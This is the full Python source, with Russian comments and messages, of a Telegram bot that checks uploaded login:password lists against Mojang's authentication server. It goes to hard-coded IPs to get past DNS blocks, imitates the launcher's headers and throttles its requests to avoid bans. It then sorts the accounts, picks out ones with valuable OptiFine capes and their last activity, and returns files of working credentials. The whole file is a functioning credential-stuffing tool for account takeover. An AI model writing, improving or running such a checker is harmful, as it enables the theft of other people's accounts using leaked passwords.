import os
import logging
import asyncio
import aiofiles
import requests
import json
import time
import sys
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# IP адреса Mojang (на случай если DNS ляжет)
MOJANG_IPS = ['34.96.72.24', '34.96.72.82', '34.96.72.143', '34.96.72.167']

# Статистика
bot_stats = {
    'total_checked': 0,
    'valid_accounts': 0,
    'invalid_accounts': 0,
    'cape_found': 0,
    'start_time': datetime.now()
}

# Файл блокировки
LOCK_FILE = '/tmp/bot.lock'

def check_single_instance():
    """Проверяет что только один бот запущен"""
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = f.read().strip()
                if pid:
                    # Проверяем жив ли процесс
                    try:
                        os.kill(int(pid), 0)
                        logger.error(f"❌ Бот уже запущен с PID {pid}")
                        sys.exit(1)
                    except:
                        # Процесс мертв, можем запускаться
                        pass
        except:
            pass
    
    # Создаем lock файл
    with open(LOCK_FILE, 'w') as f:
        f.write(str(os.getpid()))
    
    logger.info(f"✅ Создан lock файл, PID: {os.getpid()}")

class AccountChecker:
    """Проверка аккаунтов"""
    
    @staticmethod
    async def check_account(login, password):
        """Проверяет один аккаунт"""
        session = requests.Session()
        
        # Настройки сессии
        session.trust_env = False
        session.timeout = 30
        
        # Заголовки как у реального лаунчера
        headers = {
            'User-Agent': 'Minecraft Launcher/2.2.1234',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        session.headers.update(headers)
        
        try:
            login = login.strip()
            password = password.strip()
            
            logger.info(f"🔍 Проверяю: {login[:15]}...")
            
            auth_payload = {
                "agent": {
                    "name": "Minecraft",
                    "version": 1
                },
                "username": login,
                "password": password,
                "requestUser": True
            }
            
            # Пробуем разные способы подключения
            auth_data = None
            username = None
            uuid = None
            last_error = None
            
            # СПОСОБ 1: Прямое подключение по IP
            for ip in MOJANG_IPS:
                try:
                    logger.info(f"📡 Попытка подключения к IP: {ip}")
                    
                    # Важно! Указываем Host заголовок
                    direct_headers = {
                        'Host': 'authserver.mojang.com',
                        'Content-Type': 'application/json',
                        'User-Agent': 'Minecraft Launcher/2.2.1234'
                    }
                    
                    response = session.post(
                        f'https://{ip}/authenticate',
                        json=auth_payload,
                        headers=direct_headers,
                        timeout=25,
                        verify=True
                    )
                    
                    if response.status_code == 200:
                        auth_data = response.json()
                        logger.info(f"✅ Успех! IP {ip} работает")
                        break
                    else:
                        logger.warning(f"⚠️ IP {ip} вернул код {response.status_code}")
                        
                except Exception as e:
                    last_error = e
                    logger.warning(f"❌ IP {ip} не ответил: {str(e)[:30]}")
                    continue
            
            # СПОСОБ 2: Обычный запрос (если вдруг DNS заработал)
            if not auth_data:
                try:
                    logger.info("📡 Попытка обычного запроса")
                    response = session.post(
                        'https://authserver.mojang.com/authenticate',
                        json=auth_payload,
                        timeout=25
                    )
                    
                    if response.status_code == 200:
                        auth_data = response.json()
                        logger.info("✅ Обычный запрос сработал!")
                except:
                    pass
            
            if not auth_data:
                return {
                    'login': login,
                    'status': 'error',
                    'error': '🔌 Нет связи с Mojang (DNS блокировка)'
                }
            
            # Проверяем ответ
            if 'error' in auth_data:
                error_msg = auth_data.get('errorMessage', 'Неизвестная ошибка')
                if 'Invalid credentials' in error_msg:
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': '❌ Неверный логин/пароль'
                    }
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': f'⚠️ {error_msg[:50]}'
                }
            
            if 'selectedProfile' not in auth_data:
                return {
                    'login': login,
                    'status': 'migrated',
                    'error': '🔄 Аккаунт в Microsoft'
                }
            
            # Данные аккаунта
            uuid = auth_data['selectedProfile']['id']
            username = auth_data['selectedProfile']['name']
            
            logger.info(f"✅ Авторизация: {username}")
            
            # Проверка плаща
            cape_result = await AccountChecker.check_optifine_cape(username)
            
            # Последний вход
            last_login = await AccountChecker.get_last_login(username)
            
            return {
                'login': login,
                'password': password,
                'username': username,
                'uuid': uuid,
                'status': 'valid',
                'has_cape': cape_result['has_cape'],
                'cape_name': cape_result.get('cape_name', 'OptiFine Cape'),
                'cape_url': cape_result.get('cape_url'),
                'last_login': last_login['last_seen'],
                'activity': last_login['activity']
            }
            
        except Exception as e:
            logger.error(f"💥 Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': f'💥 {str(e)[:30]}'
            }
        finally:
            session.close()
    
    @staticmethod
    async def check_optifine_cape(username):
        """Проверка плаща на optifine.net"""
        try:
            # Пробуем разные варианты URL
            cape_urls = [
                f"https://optifine.net/capes/{username}.png",
                f"http://optifine.net/capes/{username}.png",
                f"https://s.optifine.net/capes/{username}.png"
            ]
            
            for cape_url in cape_urls:
                try:
                    response = requests.get(
                        cape_url, 
                        timeout=5, 
                        stream=True,
                        headers={'User-Agent': 'Mozilla/5.0'}
                    )
                    
                    if response.status_code == 200:
                        content_type = response.headers.get('content-type', '')
                        content_length = int(response.headers.get('content-length', 0))
                        
                        # Проверяем что это реальная картинка (не 1x1 пиксель)
                        if 'image' in content_type and content_length > 1000:
                            logger.info(f"🔥 Есть плащ! {username}")
                            
                            # Пытаемся определить тип плаща
                            cape_name = "OptiFine Cape"
                            if 'capeof' in cape_url.lower():
                                cape_name = "OptiFine Cape"
                            
                            return {
                                'has_cape': True,
                                'cape_name': cape_name,
                                'cape_url': cape_url
                            }
                except:
                    continue
            
            return {'has_cape': False}
            
        except Exception as e:
            logger.error(f"Ошибка проверки плаща: {e}")
            return {'has_cape': False}
    
    @staticmethod
    async def get_last_login(username):
        """Получаем дату последнего входа"""
        try:
            # Получаем UUID
            uuid_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
            uuid_resp = requests.get(uuid_url, timeout=5)
            
            if uuid_resp.status_code != 200:
                return {'last_seen': '❓ неизвестно', 'activity': '❓'}
            
            uuid_data = uuid_resp.json()
            uuid = uuid_data['id']
            
            # Запрос к NameMC
            namemc_url = f"https://api.namemc.com/profile/{uuid}"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            
            response = requests.get(namemc_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                
                if 'lastSeen' in data:
                    last_seen = data['lastSeen'] / 1000
                    last_date = datetime.fromtimestamp(last_seen)
                    days = (datetime.now() - last_date).days
                    
                    if days == 0:
                        return {'last_seen': '🔥 сегодня', 'activity': '🔥 онлайн'}
                    elif days == 1:
                        return {'last_seen': '✅ вчера', 'activity': '✅ был'}
                    elif days < 7:
                        return {'last_seen': f'📅 {days} дн', 'activity': '📅 активен'}
                    elif days < 30:
                        return {'last_seen': f'💤 {days} дн', 'activity': '💤 давно'}
                    else:
                        return {'last_seen': f'😴 {days} дн', 'activity': '😴 заброшен'}
            
            return {'last_seen': '❓ неизвестно', 'activity': '❓'}
            
        except Exception as e:
            return {'last_seen': '❌ ошибка', 'activity': '❌'}

async def process_file(file_path, update, context):
    """Обрабатывает файл с аккаунтами"""
    results = {
        'valid': [],
        'with_cape': [],
        'invalid': [],
        'migrated': [],
        'error': []
    }
    
    progress_msg = await update.message.reply_text(
        "🔄 **Начинаю обработку файла...**\n"
        "⏳ Это может занять несколько минут",
        parse_mode=ParseMode.MARKDOWN
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        bad_lines = 0
        
        for line in lines:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2 and parts[0] and parts[1]:
                    accounts.append((parts[0].strip(), parts[1].strip()))
                else:
                    bad_lines += 1
            elif line:
                bad_lines += 1
        
        total = len(accounts)
        
        if total == 0:
            await progress_msg.edit_text(
                "❌ **В файле нет валидных аккаунтов!**\n"
                "Нужен формат: логин:пароль",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Инфо о файле
        file_info = (
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📦 **Размер:** {update.message.document.file_size / 1024:.1f} КБ\n"
            f"📊 **Аккаунтов:** {total}\n"
            f"⚠️ **Битых строк:** {bad_lines}\n\n"
            f"🔄 **Начинаю проверку...**"
        )
        await progress_msg.edit_text(file_info, parse_mode=ParseMode.MARKDOWN)
        
        start_time = time.time()
        
        # Проверяем аккаунты
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс
            if i % 3 == 0 or i == total:
                elapsed = time.time() - start_time
                remaining = (elapsed / i) * (total - i) if i > 0 else 0
                
                progress = (
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"🔥 **Плащей:** {len(results['with_cape'])}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Прошло:** {int(elapsed)}с\n"
                    f"⏳ **Осталось:** ~{int(remaining)}с\n\n"
                    f"🔄 **Проверяю:** `{login[:20]}...`"
                )
                await progress_msg.edit_text(progress, parse_mode=ParseMode.MARKDOWN)
            
            # Проверка
            result = await AccountChecker.check_account(login, password)
            
            # Сортируем
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['with_cape'].append(result)
                    bot_stats['cape_found'] += 1
                bot_stats['valid_accounts'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                bot_stats['invalid_accounts'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid_accounts'] += 1
            else:
                results['error'].append(result)
                bot_stats['invalid_accounts'] += 1
            
            bot_stats['total_checked'] += 1
            await asyncio.sleep(0.3)  # Пауза чтоб не забанили
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # 1. Файл с плащами
        if results['with_cape']:
            cape_file = f"🔥_ПЛАЩИ_{len(results['with_cape'])}шт_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥🔥🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥🔥🔥\n")
                await f.write("="*60 + "\n\n")
                for acc in results['with_cape']:
                    await f.write(
                        f"📧 Логин: {acc['login']}\n"
                        f"🔑 Пароль: {acc['password']}\n"
                        f"👤 Ник: {acc['username']}\n"
                        f"🔥 Плащ: {acc['cape_name']}\n"
                        f"📅 Последний вход: {acc['last_login']}\n"
                        f"📊 Активность: {acc['activity']}\n"
                        f"🆔 UUID: {acc['uuid']}\n"
                        f"{'-'*40}\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Найдено плащей: {len(results['with_cape'])}**"
                )
            os.remove(cape_file)
        
        # 2. Все рабочие
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих аккаунтов: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # 3. Битые
        if results['invalid'] or results['migrated'] or results['error']:
            invalid_file = f"❌_БИТЫЕ_{len(results['invalid'])+len(results['migrated'])+len(results['error'])}шт_{timestamp}.txt"
            async with aiofiles.open(invalid_file, 'w', encoding='utf-8') as f:
                await f.write("❌❌❌ НЕРАБОЧИЕ АККАУНТЫ ❌❌❌\n\n")
                
                if results['invalid']:
                    await f.write("⚠️ Неверный логин/пароль:\n")
                    for acc in results['invalid'][:30]:
                        await f.write(f"📧 {acc['login']}:{acc['password']} - {acc.get('error', '?')}\n")
                
                if results['migrated']:
                    await f.write("\n🔄 Аккаунты в Microsoft:\n")
                    for acc in results['migrated'][:30]:
                        await f.write(f"📧 {acc['login']}:{acc['password']}\n")
                
                if results['error']:
                    await f.write("\n💥 Ошибки подключения:\n")
                    for acc in results['error'][:30]:
                        await f.write(f"📧 {acc['login']}:{acc['password']} - {acc.get('error', '?')}\n")
            
            with open(invalid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=invalid_file,
                    caption=f"⚠️ **Битых аккаунтов: {len(results['invalid'])+len(results['migrated'])+len(results['error'])}**"
                )
            os.remove(invalid_file)
        
        # Итоговая статистика
        elapsed_time = time.time() - start_time
        minutes = int(elapsed_time // 60)
        seconds = int(elapsed_time % 60)
        
        stats_text = (
            f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
            f"📊 **Статистика:**\n"
            f"┌─────────────────────\n"
            f"│ 📥 Всего: {total}\n"
            f"│ ✅ Рабочих: {len(results['valid'])}\n"
            f"│ 🔥 С плащами: {len(results['with_cape'])}\n"
            f"│ ❌ Неверных: {len(results['invalid'])}\n"
            f"│ 🔄 В Microsoft: {len(results['migrated'])}\n"
            f"│ 💥 Ошибок: {len(results['error'])}\n"
            f"└─────────────────────\n\n"
            f"⏱ **Время:** {minutes}м {seconds}с\n"
            f"📁 **Файлы отправлены!**"
        )
        
        await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
        
        # Если есть плащи - показываем топ
        if results['with_cape']:
            cape_list = "🔥 **ТОП НАЙДЕННЫХ ПЛАЩЕЙ:**\n\n"
            for acc in results['with_cape'][:10]:
                cape_list += f"• **{acc['username']}** - {acc['cape_name']}\n"
                cape_list += f"  📅 {acc['last_login']} | {acc['activity']}\n\n"
            
            if len(results['with_cape']) > 10:
                cape_list += f"... и еще {len(results['with_cape']) - 10} аккаунтов"
            
            await update.message.reply_text(cape_list, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"💥 Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# КОМАНДЫ
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Доступ запрещен**\nУ тебя нет прав на использование этого бота.")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    # Кнопки
    keyboard = [
        [InlineKeyboardButton("📊 Статистика", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')],
        [InlineKeyboardButton("📝 Формат файла", callback_data='format')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        f"👋 **Привет, {update.effective_user.first_name}!**\n\n"
        f"🔍 **OptiFine Cape Checker Bot**\n"
        f"┌─────────────────────────\n"
        f"│ 📊 Всего проверено: {bot_stats['total_checked']}\n"
        f"│ ✅ Валидных: {bot_stats['valid_accounts']}\n"
        f"│ 🔥 С плащами: {bot_stats['cape_found']}\n"
        f"│ ❌ Невалидных: {bot_stats['invalid_accounts']}\n"
        f"└─────────────────────────\n\n"
        f"⏱ **Работает:** {hours}ч {minutes}мин\n"
        f"📅 **Запущен:** {bot_stats['start_time'].strftime('%d.%m.%Y %H:%M')}\n\n"
        f"📥 **Просто отправь мне .txt файл**\n"
        f"с аккаунтами в формате: `логин:пароль`"
    )
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        text = (
            f"📊 **СТАТИСТИКА БОТА**\n\n"
            f"┌─────────────────────\n"
            f"│ 📈 Проверено: {bot_stats['total_checked']}\n"
            f"│ ✅ Валидных: {bot_stats['valid_accounts']}\n"
            f"│ 🔥 С плащами: {bot_stats['cape_found']}\n"
            f"│ ❌ Невалидных: {bot_stats['invalid_accounts']}\n"
            f"└─────────────────────\n\n"
            f"⏱ **Аптайм:** {hours}ч {minutes}мин"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == 'help':
        text = (
            f"❓ **КАК ПОЛЬЗОВАТЬСЯ**\n\n"
            f"1️⃣ **Подготовь файл**\n"
            f"   • Создай .txt файл\n"
            f"   • Каждая строка: `логин:пароль`\n\n"
            f"2️⃣ **Отправь файл**\n"
            f"   • Нажми на скрепку 📎\n"
            f"   • Выбери свой .txt файл\n\n"
            f"3️⃣ **Получи результат**\n"
            f"   • Бот покажет прогресс\n"
            f"   • Пришлет 3 файла:\n"
            f"     🔥 С плащами\n"
            f"     ✅ Рабочие\n"
            f"     ❌ Битые\n\n"
            f"⚠️ **Важно:**\n"
            f"• Только старые аккаунты Mojang\n"
            f"• Microsoft аккаунты не работают\n"
            f"• Максимум 500 аккаунтов за раз"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
    
    elif query.data == 'format':
        text = (
            f"📝 **ФОРМАТ ФАЙЛА**\n\n"
            f"✅ **Правильно:**\n"
            f"```\n"
            f"email1@gmail.com:qwerty123\n"
            f"email2@mail.ru:minecraft2024\n"
            f"email3@yandex.ru:pass123\n"
            f"```\n\n"
            f"❌ **Неправильно:**\n"
            f"```\n"
            f"email gmail.com pass123 (нет :)\n"
            f":password123 (нет логина)\n"
            f"login: (нет пароля)\n"
            f"```\n\n"
            f"📦 **Что получишь:**\n"
            f"• 🔥 Файл с плащами\n"
            f"• ✅ Файл с рабочими\n"
            f"• ❌ Файл с битыми"
        )
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика"""
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    text = (
        f"📊 **СТАТИСТИКА**\n\n"
        f"┌─────────────────────\n"
        f"│ 📈 Всего: {bot_stats['total_checked']}\n"
        f"│ ✅ Рабочих: {bot_stats['valid_accounts']}\n"
        f"│ 🔥 С плащами: {bot_stats['cape_found']}\n"
        f"│ ❌ Битых: {bot_stats['invalid_accounts']}\n"
        f"└─────────────────────\n\n"
        f"⏱ **Аптайм:** {hours}ч {minutes}мин"
    )
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    user_id = update.effective_user.id
    
    if ALLOWED_USERS and user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ **Нет доступа**")
        return
    
    doc = update.message.document
    
    # Проверка расширения
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text(
            "❌ **Нужен .txt файл!**\n"
            "Отправь текстовый файл с аккаунтами.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Проверка размера
    if doc.file_size > 10 * 1024 * 1024:  # 10 МБ
        await update.message.reply_text(
            "❌ **Файл слишком большой!**\n"
            f"📦 Размер: {doc.file_size / 1024 / 1024:.1f} МБ\n"
            "⚠️ Максимум: 10 МБ",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        # Инфо о файле
        await update.message.reply_text(
            f"📥 **Файл получен!**\n"
            f"┌─────────────────────\n"
            f"│ 📄 Имя: {doc.file_name}\n"
            f"│ 📦 Размер: {doc.file_size / 1024:.1f} КБ\n"
            f"└─────────────────────\n\n"
            f"🔄 **Начинаю обработку...**",
            parse_mode=ParseMode.MARKDOWN
        )
        
        # Скачиваем
        file = await context.bot.get_file(doc.file_id)
        file_path = f"temp_{user_id}_{doc.file_name}"
        await file.download_to_drive(file_path)
        
        # Обрабатываем
        await process_file(file_path, update, context)
        
    except Exception as e:
        logger.error(f"💥 Ошибка: {e}")
        await update.message.reply_text(f"❌ **Ошибка:** {str(e)[:100]}")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка ошибок"""
    logger.error(f"💥 Ошибка: {context.error}")
    try:
        if update and update.message:
            await update.message.reply_text(
                "❌ **Что-то пошло не так...**\n"
                "Попробуй еще раз или позже.",
                parse_mode=ParseMode.MARKDOWN
            )
    except:
        pass

def main():
    """Запуск"""
    if not TOKEN:
        print("❌ НЕТ ТОКЕНА! Добавь BOT_TOKEN в переменные окружения")
        return
    
    # Проверяем что только один экземпляр
    check_single_instance()
    
    print("=" * 50)
    print("🚀 ЗАПУСК OptiFine CAPE CHECKER")
    print("=" * 50)
    print(f"📊 Статистика: {bot_stats}")
    print(f"👥 Админы: {ADMIN_IDS if ADMIN_IDS else 'Нет - бот для всех'}")
    print(f"🌐 IP адреса Mojang: {MOJANG_IPS}")
    print("=" * 50)
    
    try:
        # Создаем приложение
        app = Application.builder().token(TOKEN).build()
        
        # Добавляем обработчики
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("stats", stats_command))
        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        app.add_error_handler(error_handler)
        
        print("✅ БОТ ЗАПУЩЕН! Жду файлы...")
        app.run_polling()
        
    except Exception as e:
        logger.error(f"💥 Фатальная ошибка: {e}")
        print(f"❌ Ошибка: {e}")

if __name__ == '__main__':
    main()